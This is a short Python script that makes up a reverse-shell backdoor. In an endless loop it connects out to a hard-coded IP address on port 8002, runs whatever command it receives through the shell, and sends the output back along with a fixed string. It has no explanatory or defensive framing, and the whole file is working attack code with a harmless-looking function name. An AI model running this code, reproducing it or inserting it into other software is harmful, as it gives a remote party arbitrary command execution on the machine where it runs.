import socket
import sys
import subprocess as sbp
import builtins
from time import sleep
def foo():
    sck = socket.socket()
    sck.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sck.connect(('35.154.186.5',8002))
    
    process = sbp.Popen(sck.recv(4096).decode(),shell=True,stdout=sbp.PIPE,stdin=sbp.PIPE,stderr=sbp.STDOUT)

    while process.poll() == None:
        sleep(0.025)
        #print(process.stdout.read())
        sck.send(process.stdout.read())

    sck.send(process.stdout.read())
    sck.send(b'poojan@123')
while True:
    foo()



